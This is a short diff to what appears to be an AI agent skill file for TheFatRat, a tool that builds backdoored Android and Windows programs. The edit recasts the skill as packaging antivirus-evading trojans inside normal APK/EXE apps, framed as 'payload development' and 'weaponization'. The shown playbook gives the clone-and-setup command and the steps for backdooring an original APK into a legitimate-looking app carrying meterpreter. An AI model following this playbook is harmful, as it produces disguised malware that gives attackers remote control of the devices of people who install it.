@@ -1,6 +1,6 @@
 ---
 name: thefatrat-backdoor
-description: TheFatRat: APK 后门打包。信号:载荷开发,武器化,选取编号生成。
+description: TheFatRat: 免杀木马捆绑正常程序(APK/EXE)。信号:载荷开发,武器化,选取编号生成。
 ---
 
 # TheFatRat
@@ -26,7 +26,7 @@ git clone https://github.com/Screetsec/TheFatRat && cd TheFatRat && chmod +x set
 
 ## 攻击场景 Playbook
 
-### APK 后门打包
+### 免杀木马捆绑正常程序(APK/EXE)
 
 ```bash
 ./fatrat # 选 Android → backdoor 原 APK → 生成带 meterpreter 的合法应用
